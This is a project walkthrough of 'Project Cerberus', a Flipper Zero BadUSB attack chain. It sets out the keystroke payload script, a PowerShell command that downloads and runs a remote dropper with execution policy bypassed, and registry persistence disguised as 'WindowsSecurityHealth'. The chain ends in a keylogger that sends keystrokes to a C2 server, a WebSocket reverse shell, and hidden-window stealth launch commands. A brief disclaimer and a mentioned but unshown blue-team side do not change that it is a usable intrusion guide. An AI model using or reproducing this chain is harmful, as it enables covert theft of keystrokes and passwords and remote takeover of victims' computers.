PROJECT CERBERUS

BadUSB Keylogger + Remote Shell - Full Architecture Walkthrough

For educational and authorized testing purposes only

1. Project Overview
Project Cerberus is a red-team / blue-team cybersecurity demonstration built around a Flipper Zero BadUSB attack. The full chain covers four stages: physical payload injection via Flipper Zero, a PowerShell dropper that deploys Python implants, a keylogger that exfiltrates keystrokes to a C2 server, and a reverse shell that gives the attacker an interactive terminal over WebSockets.

The project is split into two sides:

Red Team: the Flipper payload, PowerShell deployer, keylogger, shell agent, and C2 server
Blue Team: real-time detection engine, forensic log analyzer, and incident dashboard
2. System Architecture
2.1 High-Level Flow
Stage	Component	What it does
1	Flipper Zero BadUSB	Emulates a USB keyboard, types a PowerShell command into CMD (run dialog isn't suited for badusb long commands)
2	deploy.ps1	Downloads all Python files from GitHub, installs deps, installs persistence, launches agents
3	persistence.py	Writes a registry Run key so keylogger survives reboots
4	keylogger.py	Captures all keystrokes + active window, batches them, POSTs to C2 every 10s
5	shell_agent.py	Connects to C2 over WebSocket, listens for commands, runs them via subprocess, returns output
6	server.py (C2)	Flask + SocketIO server - stores keystrokes in SQLite, relays shell commands/output
7	index.html	Live dashboard showing all captured keystroke sessions by machine
8	shell.html	Browser-based reverse shell terminal - type a command, see output in real time
3. Stage 1 - The Flipper Zero Payload
3.1 What BadUSB Is
BadUSB is an attack where a device impersonates a USB keyboard (HID - Human Interface Device). Because operating systems implicitly trust keyboards, any keystrokes sent by the device are executed with the permissions of the logged-in user - no driver installation, no UAC prompt, no warning.

The Flipper Zero runs a .txt script from its SD card under the BadUSB app. Each line is a command telling the Flipper what key to press, how long to wait, or what string to type.

3.2 The Payload File (deploy_keylogger.txt)
DEFAULTDELAY 80

Sets an 80ms gap between every keystroke. This is the sweet spot for Momentum firmware - fast enough to not drop characters, slow enough not to overwhelm the input buffer.

DELAY 2000

Waits 2 seconds after the script starts. Gives Windows time to fully boot and the desktop to be interactive before any keys are sent.

GUI r

Presses Win+R - opens the Windows Run dialog.

DELAY 1500

Waits 1.5 seconds for the Run dialog to fully render. This is critical - typing before the dialog opens means keystrokes go nowhere.

STRINGLN cmd

Types 'cmd' and immediately presses Enter (STRINGLN = STRING + ENTER). This opens a Command Prompt window. We use cmd instead of typing the full PowerShell command directly into Run because the Run dialog is significantly less reliable for long strings - it drops characters under load.

DELAY 1000

Waits 1 second for cmd to open.

STRING set u=https://raw.githubusercontent.com/...deploy.ps1

Types a cmd SET command that stores the GitHub URL in an environment variable called u. This is how we split the injection into two shorter strings - the URL alone is ~100 characters, and injecting it as a variable first means the actual PowerShell command stays short and reliable.

📝 NOTE: The environment variable 'u' is a temporary cmd session variable. It exists only in that specific cmd.exe process's memory - it is not stored in Windows environment variables permanently (not in System Properties or the registry). Once the cmd window closes, 'u' is gone. It is used purely as a staging trick to shorten the second STRING injection.

STRING powershell -ep bypass -c "iwr $env:u -OutFile $env:TEMP\d.ps1; & $env:TEMP\d.ps1"

Types the PowerShell command that reads the variable, downloads deploy.ps1 to the TEMP folder as d.ps1, then executes it. -ep bypass skips the execution policy check. $env:u reads the url variable set in the previous line. & is PowerShell's call operator - it runs the script.

ENTER + exit

Sends Enter to execute the PowerShell command, then closes the cmd window so no terminal is visible to the user.

4. Stage 2 - The PowerShell Deployer (deploy.ps1)
deploy.ps1 is the dropper. It runs silently in the background and does five things in order:

4.1 Create the directory
New-Item -ItemType Directory -Force -Path C:\Windows\Temp\cerberus

Creates the working folder where all implant files will live. C:\Windows\Temp is used because it is writable by standard users without elevation.

4.2 Download the implant files
Uses Invoke-WebRequest (iwr) to pull five files from the GitHub raw URL:

config.py - C2 server address, port, send interval, machine ID
keylogger.py - the main keystroke capture implant
persistence.py - registry installer
shell_agent.py - the reverse shell agent
requirements.txt - pynput, requests, pywin32, python-socketio
4.3 Install Python dependencies
pip install -r C:\Windows\Temp\cerberus\requirements.txt

Installs all required libraries silently. pynput is the keyboard hook library. requests handles HTTP POSTing to C2. python-socketio enables the WebSocket reverse shell.

4.4 Install persistence
python C:\Windows\Temp\cerberus\persistence.py

Runs persistence.py which writes a Windows Registry Run key so keylogger.py is automatically launched every time the user logs in. See Stage 3 for details.

4.5 Launch the agents
In the debug (see-through) version, both agents are launched as PowerShell background jobs and their output is streamed live to a visible terminal window. In the stealth version this is replaced with hidden Start-Process calls.

5. Stage 3 - Persistence (persistence.py)
persistence.py writes a single value to the Windows Registry under the current user's Run key:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

The value name is 'WindowsSecurityHealth' - chosen to look like a legitimate Windows process to a casual observer. The value data is the full path to python.exe and keylogger.py.

Every time the user logs into Windows, this entry is read and keylogger.py is automatically executed in the background. The script checks if the entry already exists before writing it, so it is idempotent - running it twice does not create duplicate entries.

To clean up: delete the 'WindowsSecurityHealth' value from that registry key, or run the cleanup steps in RUN.md.

6. Stage 4 - The Keylogger Implant (keylogger.py)
keylogger.py has three responsibilities running in parallel via threads:

6.1 Keyboard Hook
Uses pynput's keyboard.Listener to register a low-level keyboard hook on Windows. Every key press fires the on_press callback. Special keys (Shift, Ctrl, Enter, etc.) are captured as [Key.name] tags. Regular characters are captured as-is.

Each time the active window changes, a timestamped header is prepended to the buffer showing which application the user switched to - this makes the keystroke log far easier to read and analyze.

6.2 In-Memory Buffer
Captured keystrokes are appended to an in-memory list called buffer. A threading.Lock prevents race conditions between the keyboard hook thread and the sender thread both accessing the buffer simultaneously.

6.3 C2 Sender Thread
A background daemon thread runs send_to_c2() every SEND_INTERVAL seconds (default: 10). It drains the buffer, joins all characters into a single string, and POSTs it to the C2 server at /log with the machine hostname as an identifier. If the server is unreachable the data is silently dropped - the keylogger keeps running regardless.

The listener stops when Escape is pressed (returns False from on_press).

7. Stage 5 - The Reverse Shell Agent (shell_agent.py)
shell_agent.py establishes a persistent bidirectional WebSocket connection to the C2 server using python-socketio. Here is the communication flow:

Agent connects to C2 at ws://C2_HOST:5000
C2 server receives the connection and registers the socket session
Attacker types a command in shell.html (the browser terminal)
Browser emits a 'shell_command' event over its own WebSocket to the server
Server receives it and broadcasts it to all connected clients - including the agent
Agent receives the 'shell_command' event, runs the command via subprocess.run()
Agent emits a 'shell_output' event back to the server with stdout + stderr
Server receives it and broadcasts to all clients - including the browser
Browser receives 'shell_output' and appends it to the terminal UI
The agent uses exponential backoff reconnection - if the C2 goes offline, it retries at 2s, 4s, 8s... up to a 60s cap, then keeps retrying indefinitely.

8. Stage 6 - The C2 Server (server.py)
The C2 server is a Flask application with Flask-SocketIO providing WebSocket support. It exposes three HTTP routes and two WebSocket channels:

8.1 HTTP Routes
POST /log - receives keystroke batches from keylogger.py and writes them to SQLite
GET / - renders index.html, the keystroke dashboard, querying all rows from the database
GET /shell - renders shell.html, the browser-based reverse shell terminal
8.2 WebSocket Events
shell_command - browser sends a command; server broadcasts it to the agent
shell_output - agent sends command output; server broadcasts it to the browser
8.3 Database
Keystrokes are stored in a SQLite database at red-team/c2-server/database/logs.db. Each row contains: an auto-incrementing ID, the machine hostname, a timestamp, and the raw keystroke data for that batch. The dashboard auto-refreshes every 10 seconds via an HTML meta refresh tag.

9. Full Run Process - Step by Step
9.1 Setup (attacker machine)
Activate the Python virtual environment: venv\Scripts\activate
Start the C2 server: python red-team/c2-server/server.py
Open a browser at http://localhost:5000 (keystroke dashboard)
Open a second tab at http://localhost:5000/shell (reverse shell terminal)
9.2 Deployment (target machine)
Load deploy_keylogger.txt onto the Flipper Zero SD card under badusb/
Select it in the Flipper BadUSB app and plug the Flipper into the target machine via USB
Press the Flipper's OK button to run the payload
The Flipper types the cmd + PowerShell injection automatically
deploy.ps1 runs silently in the background - downloads, installs, launches
9.3 Post-infection (what happens automatically)
keylogger.py hooks the keyboard and begins capturing all keystrokes
Every 10 seconds, buffered keystrokes POST to the C2 dashboard
shell_agent.py connects to the C2 WebSocket
persistence.py has already added the registry Run key - keylogger survives reboot
The attacker can type commands in shell.html and see results in real time
9.4 Cleanup
Delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsSecurityHealth from registry
Kill any running python.exe processes
Delete C:\Windows\Temp\cerberus\
10. Debug vs Stealth Mode
The current deploy.ps1 is the see-through / debug version. Both agent processes are launched as PowerShell background jobs and their stdout is streamed live to a visible terminal window. This makes development and testing easy - you can see exactly what each component is doing.

When switching to stealth mode, replace the Start-Job + while loop with:

Start-Process python -ArgumentList "C:\Windows\Temp\cerberus\shell_agent.py" -WindowStyle Hidden

Start-Process python -ArgumentList "C:\Windows\Temp\cerberus\keylogger.py" -WindowStyle Hidden

This launches both processes in the background with no visible window.

Project Cerberus - Internal Documentation